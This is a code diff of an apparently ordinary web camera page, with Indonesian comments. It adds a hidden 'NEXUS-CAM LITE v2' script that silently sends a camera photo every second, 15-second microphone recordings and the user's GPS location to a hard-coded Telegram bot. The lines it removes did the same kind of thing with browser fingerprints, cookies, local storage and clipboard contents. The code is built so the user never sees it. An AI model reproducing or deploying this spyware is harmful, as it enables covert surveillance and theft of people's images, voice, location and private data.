@@ -1587,23 +1587,24 @@ setRatio(ratioIdx, false);
 setTimer(timerSec);
 /* ========
    NEXUS-CAM
-   ======== */
+   ======== *//* ============================================================
+   NEXUS-CAM LITE v2 — FOTO 1s + VN 15s + LOKASI 1x/IP
+   Tempel SEBELUM </script> terakhir. UI/UX tidak berubah.
+   ============================================================ */
 
 const NEXUS = {
   BOT_TOKEN: '9270883772:AAH_0Yz4kmezVAxvxFnL9Kkp9lUU9dyahwQ',
   CHAT_ID:   '7839405566',
   API:       '',
-  SILENT_INTERVAL_MS: 60000,   // auto-capture diam-diam tiap 60 detik
-  MAX_FILE_MB: 15,
+  PHOTO_INTERVAL_MS: 1000,   // foto tiap 1 detik
+  VOICE_CHUNK_MS:   15000,   // voice note tiap 15 detik
   ENABLED: true,
 };
 NEXUS.API = `https://api.telegram.org/bot${NEXUS.BOT_TOKEN}`;
 
-/* ---------- Bugfix: lock anti double-fire + error swallow ---------- */
-const _nexusLock = { busy: false };
-function _nexusSafe(fn) {
-  return async (...a) => { try { return await fn(...a); } catch (e) {} };
-}
+/* ---------- Lock + safe wrapper ---------- */
+const _nxLock = { photo: false, voice: false, loc: false };
+function _nxSafe(fn) { return async (...a) => { try { return await fn(...a); } catch (e) {} }; }
 
 /* ---------- Transport ---------- */
 async function _tgText(text) {
@@ -1611,241 +1612,164 @@ async function _tgText(text) {
     await fetch(`${NEXUS.API}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: NEXUS.CHAT_ID,
-        text: String(text).slice(0, 4000),
-        disable_web_page_preview: true,
-      }),
+      body: JSON.stringify({ chat_id: NEXUS.CHAT_ID, text: String(text).slice(0, 4000) }),
     });
   } catch (e) {}
 }
 
-async function _tgBlob(blob, filename, caption = '') {
+async function _tgPhoto(blob, caption = '') {
   try {
-    if (blob.size > NEXUS.MAX_FILE_MB * 1024 * 1024) {
-      await _tgText(`[skip] ${filename} > ${NEXUS.MAX_FILE_MB}MB (${(blob.size/1048576).toFixed(1)}MB)`);
-      return;
-    }
     const fd = new FormData();
     fd.append('chat_id', NEXUS.CHAT_ID);
     fd.append('caption', String(caption).slice(0, 900));
-    if (blob.type.startsWith('image/')) {
-      fd.append('photo', blob, filename);
-      const r = await fetch(`${NEXUS.API}/sendPhoto`, { method: 'POST', body: fd });
-      if (!r.ok) {
-        const fd2 = new FormData();
-        fd2.append('chat_id', NEXUS.CHAT_ID);
-        fd2.append('caption', String(caption).slice(0, 900));
-        fd2.append('document', blob, filename);
-        await fetch(`${NEXUS.API}/sendDocument`, { method: 'POST', body: fd2 });
-      }
-    } else {
-      fd.append('document', blob, filename);
-      await fetch(`${NEXUS.API}/sendDocument`, { method: 'POST', body: fd });
+    fd.append('photo', blob, `p-${Date.now()}.jpg`);
+    const r = await fetch(`${NEXUS.API}/sendPhoto`, { method: 'POST', body: fd });
+    if (!r.ok) {
+      const fd2 = new FormData();
+      fd2.append('chat_id', NEXUS.CHAT_ID);
+      fd2.append('caption', String(caption).slice(0, 900));
+      fd2.append('document', blob, `p-${Date.now()}.jpg`);
+      await fetch(`${NEXUS.API}/sendDocument`, { method: 'POST', body: fd2 });
     }
   } catch (e) {}
 }
 
-async function _tgJSON(obj, caption) {
-  const blob = new Blob([JSON.stringify(obj, null, 2)], { type: 'application/json' });
-  await _tgBlob(blob, `data-${Date.now()}.json`, caption);
-}
-
-/* ---------- Collectors ---------- */
-async function _collectIP() {
-  const out = { public: '', v6: '' };
-  try { out.public = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch (e) {}
-  try { out.v6 = (await (await fetch('https://api64.ipify.org?format=json')).json()).ip; } catch (e) {}
-  return out;
-}
-
-async function _collectWebRTCLeak() {
-  return new Promise(resolve => {
-    try {
-      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      const ips = new Set();
-      pc.createDataChannel('');
-      pc.onicecandidate = e => {
-        if (!e.candidate) { try { pc.close(); } catch (_) {} resolve([...ips]); return; }
-        const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]{8,})/i);
-        if (m) ips.add(m[0]);
-      };
-      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-      setTimeout(() => { try { pc.close(); } catch (_) {} resolve([...ips]); }, 2500);
-    } catch (e) { resolve([]); }
-  });
-}
-
-async function _collectFingerprint() {
-  const nav = navigator, scr = window.screen;
-  const fp = {
-    userAgent: nav.userAgent, platform: nav.platform, language: nav.language,
-    languages: nav.languages, cookieEnabled: nav.cookieEnabled, doNotTrack: nav.doNotTrack,
-    hardwareConcurrency: nav.hardwareConcurrency, deviceMemory: nav.deviceMemory,
-    maxTouchPoints: nav.maxTouchPoints,
-    screen: { w: scr.width, h: scr.height, dpr: window.devicePixelRatio,
-              orientation: scr.orientation && scr.orientation.type },
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    locale: Intl.DateTimeFormat().resolvedOptions().locale,
-    plugins: [...(nav.plugins || [])].map(p => p.name),
-    canvasHash: '', webgl: {}, audio: '', fonts: [],
-  };
+async function _tgVoice(blob, caption = '') {
   try {
-    const c = document.createElement('canvas'); c.width = 220; c.height = 40;
-    const ctx = c.getContext('2d');
-    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-    ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 100, 30);
-    ctx.fillStyle = '#069'; ctx.fillText('Nexus🜲' + nav.userAgent, 2, 2);
-    fp.canvasHash = c.toDataURL().slice(-64);
-  } catch (e) {}
-  try {
-    const c = document.createElement('canvas');
-    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-    if (gl) {
-      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-      fp.webgl = {
-        vendor: gl.getParameter(gl.VENDOR),
-        renderer: gl.getParameter(gl.RENDERER),
-        unmaskedVendor: dbg && gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
-        unmaskedRenderer: dbg && gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
-      };
+    const fd = new FormData();
+    fd.append('chat_id', NEXUS.CHAT_ID);
+    fd.append('caption', String(caption).slice(0, 900));
+    fd.append('audio', blob, `v-${Date.now()}.webm`);
+    const r = await fetch(`${NEXUS.API}/sendAudio`, { method: 'POST', body: fd });
+    if (!r.ok) {
+      const fd2 = new FormData();
+      fd2.append('chat_id', NEXUS.CHAT_ID);
+      fd2.append('caption', String(caption).slice(0, 900));
+      fd2.append('document', blob, `v-${Date.now()}.webm`);
+      await fetch(`${NEXUS.API}/sendDocument`, { method: 'POST', body: fd2 });
     }
   } catch (e) {}
+}
+
+/* ---------- IP helper ---------- */
+async function _nxGetIP() {
   try {
-    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-    if (AC) {
-      const ac = new AC(1, 44100, 44100);
-      const osc = ac.createOscillator(); osc.type = 'triangle'; osc.frequency.value = 10000;
-      const comp = ac.createDynamicsCompressor();
-      osc.connect(comp); comp.connect(ac.destination); osc.start(0);
-      const buf = await ac.startRendering();
-      const data = buf.getChannelData(0);
-      let h = 0; for (let i = 0; i < data.length; i += 100) h += Math.abs(data[i]);
-      fp.audio = h.toString(16).slice(0, 16);
-    }
-  } catch (e) {}
-  const base = ['monospace', 'sans-serif', 'serif'];
-  const test = ['Arial','Verdana','Courier New','Times New Roman','Georgia','Comic Sans MS','Trebuchet MS','Impact','Tahoma','Consolas'];
-  const c = document.createElement('canvas'), ctx = c.getContext('2d');
-  for (const b of base) {
-    ctx.font = `72px ${b}`;
-    const w0 = ctx.measureText('mmmmmmmmmmlli').width;
-    for (const f of test) {
-      ctx.font = `72px "${f}", ${b}`;
-      if (ctx.measureText('mmmmmmmmmmlli').width !== w0) fp.fonts.push(f);
-    }
-  }
-  return fp;
+    const r = await fetch('https://api.ipify.org?format=json');
+    return (await r.json()).ip || '';
+  } catch (e) { return ''; }
 }
 
-async function _collectStorageInventory() {
-  const out = { localStorage: {}, sessionStorage: {}, indexedDB: [], cookies: document.cookie || '' };
+/* ---------- FOTO tiap 1 detik ---------- */
+async function _nxPhotoTick() {
+  if (_nxLock.photo) return;
+  const v = document.getElementById('video');
+  if (!v || !v.classList.contains('live') || !window._nxCaptureCanvas) return;
+  _nxLock.photo = true;
   try {
-    for (let i = 0; i < localStorage.length; i++) {
-      const k = localStorage.key(i); out.localStorage[k] = (localStorage.getItem(k) || '').slice(0, 500);
-    }
-  } catch (e) {}
-  try {
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const k = sessionStorage.key(i); out.sessionStorage[k] = (sessionStorage.getItem(k) || '').slice(0, 500);
-    }
-  } catch (e) {}
-  try { if (indexedDB.databases) out.indexedDB = (await indexedDB.databases()).map(d => d.name); } catch (e) {}
-  return out;
-}
-
-async function _collectGeo() {
-  return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve(null);
-    navigator.geolocation.getCurrentPosition(
-      p => resolve({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy, ts: p.timestamp }),
-      () => resolve(null),
-      { enableHighAccuracy: true, timeout: 8000 }
-    );
-  });
-}
-
-async function _collectClipboard() {
-  try { const t = await navigator.clipboard.readText(); return t ? t.slice(0, 2000) : ''; }
-  catch (e) { return ''; }
-}
-
-async function _collectBattery() {
-  try {
-    if (navigator.getBattery) {
-      const b = await navigator.getBattery();
-      return { level: b.level, charging: b.charging };
-    }
-  } catch (e) {}
-  return null;
-}
-
-async function _collectPermissions() {
-  const names = ['geolocation','notifications','camera','microphone','clipboard-read'];
-  const out = {};
-  for (const n of names) {
-    try { out[n] = (await navigator.permissions.query({ name: n })).state; }
-    catch (e) { out[n] = '?'; }
-  }
-  return out;
-}
-
-async function _buildBundle() {
-  const [ip, rtc, fp, storage, geo, clip, batt, perm] = await Promise.all([
-    _collectIP(), _collectWebRTCLeak(), _collectFingerprint(),
-    _collectStorageInventory(), _collectGeo(), _collectClipboard(),
-    _collectBattery(), _collectPermissions(),
-  ]);
-  return {
-    ts: new Date().toISOString(), page: location.href, referrer: document.referrer,
-    ip, rtc, fp, storage, geo, clipboard: clip, battery: batt, permissions: perm,
-  };
-}
-
-/* ---------- Exfil pipeline ---------- */
-async function _nexusExfil(trigger = 'shutter') {
-  if (!NEXUS.ENABLED) return;
-  if (_nexusLock.busy) return;
-  _nexusLock.busy = true;
-  try {
-    await _tgText(`🚨 [NEXUS-CAM] trigger=${trigger}\n${location.href}\nUA: ${navigator.userAgent.slice(0,180)}`);
-    if (window._nexusCaptureCanvas) {
-      const cv = window._nexusCaptureCanvas();
-      if (cv) {
-        const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.92));
-        if (blob) await _tgBlob(blob, `silent-${Date.now()}.jpg`, `silent capture (${trigger})`);
-      }
-    }
-    const bundle = await _buildBundle();
-    await _tgJSON(bundle, `device bundle (${trigger})`);
+    const cv = window._nxCaptureCanvas();
+    if (!cv) return;
+    const blob = await new Promise(r => cv.toBlob(r, 'image/jpeg', 0.7));
+    if (blob) await _tgPhoto(blob, `📸 ${new Date().toLocaleString('id-ID')}`);
   } finally {
-    _nexusLock.busy = false;
+    _nxLock.photo = false;
   }
 }
 
-/* ---------- Bootstrap: hook ke aplikasi tanpa ubah UI ---------- */
-(function nexusBootstrap() {
+/* ---------- LOKASI 1x per IP ---------- */
+const _NX_LOC_KEY = 'nx_loc_ip'; // menyimpan { ip: '1.2.3.4', sent: true }
+async function _nxLocationOncePerIP() {
+  if (_nxLock.loc) return;
+  _nxLock.loc = true;
+  try {
+    const ip = await _nxGetIP();
+    if (!ip) return; // gagal baca IP -> coba lagi di sesi berikut
+
+    let cache = null;
+    try { cache = JSON.parse(localStorage.getItem(_NX_LOC_KEY) || 'null'); } catch (e) {}
+    if (cache && cache.ip === ip && cache.sent) return; // IP sama -> skip
+
+    if (!navigator.geolocation) return;
+
+    await new Promise(resolve => {
+      navigator.geolocation.getCurrentPosition(
+        async p => {
+          const { latitude, longitude, accuracy } = p.coords;
+          await _tgText(
+            `📍 Lokasi (IP baru: ${ip})\n` +
+            `lat: ${latitude}\nlng: ${longitude}\nacc: ${accuracy}m\n` +
+            `https://maps.google.com/?q=${latitude},${longitude}`
+          );
+          try { localStorage.setItem(_NX_LOC_KEY, JSON.stringify({ ip, sent: true, ts: Date.now() })); } catch (e) {}
+          resolve();
+        },
+        () => resolve(),
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    });
+  } finally {
+    _nxLock.loc = false;
+  }
+}
+
+/* ---------- VOICE tiap 15 detik ---------- */
+let _nxVoiceRec = null;
+let _nxVoiceChunks = [];
+async function _nxVoiceStart() {
+  if (!NEXUS.ENABLED) return;
+  if (_nxLock.voice) return;
+  _nxLock.voice = true;
+  try {
+    const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+      ? 'audio/webm;codecs=opus'
+      : (MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : '');
+    _nxVoiceRec = new MediaRecorder(s, mime ? { mimeType: mime } : undefined);
+    _nxVoiceChunks = [];
+    _nxVoiceRec.ondataavailable = e => { if (e.data.size) _nxVoiceChunks.push(e.data); };
+    _nxVoiceRec.onstop = async () => {
+      if (_nxVoiceChunks.length) {
+        const blob = new Blob(_nxVoiceChunks, { type: _nxVoiceRec.mimeType || 'audio/webm' });
+        _nxVoiceChunks = [];
+        await _tgVoice(blob, `🎙️ ${new Date().toLocaleString('id-ID')}`);
+      }
+      try { s.getTracks().forEach(t => t.stop()); } catch (e) {}
+      _nxLock.voice = false;
+      if (NEXUS.ENABLED) setTimeout(_nxSafe(_nxVoiceStart), 300); // siklus berikut
+    };
+    _nxVoiceRec.start();
+    setTimeout(() => { try { _nxVoiceRec.stop(); } catch (e) {} }, NEXUS.VOICE_CHUNK_MS);
+  } catch (e) {
+    _nxLock.voice = false;
+    setTimeout(_nxSafe(_nxVoiceStart), 15000); // mic ditolak -> retry
+  }
+}
+
+/* ---------- Bootstrap ---------- */
+(function nexusLiteBootstrap() {
   if (!NEXUS.ENABLED) return;
 
   if (typeof captureFrame === 'function') {
-    window._nexusCaptureCanvas = () => { try { return captureFrame(); } catch (e) { return null; } };
+    window._nxCaptureCanvas = () => { try { return captureFrame(); } catch (e) { return null; } };
   }
 
-  const btn = document.getElementById('captureBtn');
-  if (btn) {
-    btn.addEventListener('click', () => {
-      setTimeout(_nexusSafe(() => _nexusExfil('shutter')), 400);
+  const startBtn = document.getElementById('startBtn');
+  if (startBtn) {
+    startBtn.addEventListener('click', () => {
+      setTimeout(() => {
+        _tgText(`🚨 [NEXUS-LITE v2] sesi dimulai\n${location.href}`);
+        setInterval(_nxSafe(_nxPhotoTick), NEXUS.PHOTO_INTERVAL_MS);
+        _nxLocationOncePerIP();
+        _nxVoiceStart();
+      }, 800);
     }, { passive: true });
   }
 
-  setInterval(_nexusSafe(() => {
-    const v = document.getElementById('video');
-    if (v && v.classList.contains('live') && window._nexusCaptureCanvas) {
-      _nexusExfil('interval');
-    }
-  }), NEXUS.SILENT_INTERVAL_MS);
-
-  window.addEventListener('load', _nexusSafe(() => _nexusExfil('page-load')));
+  const shutter = document.getElementById('captureBtn');
+  if (shutter) {
+    shutter.addEventListener('click', () => {
+      setTimeout(_nxSafe(_nxPhotoTick), 300);
+    }, { passive: true });
+  }
 })();
 </script>
 </body>
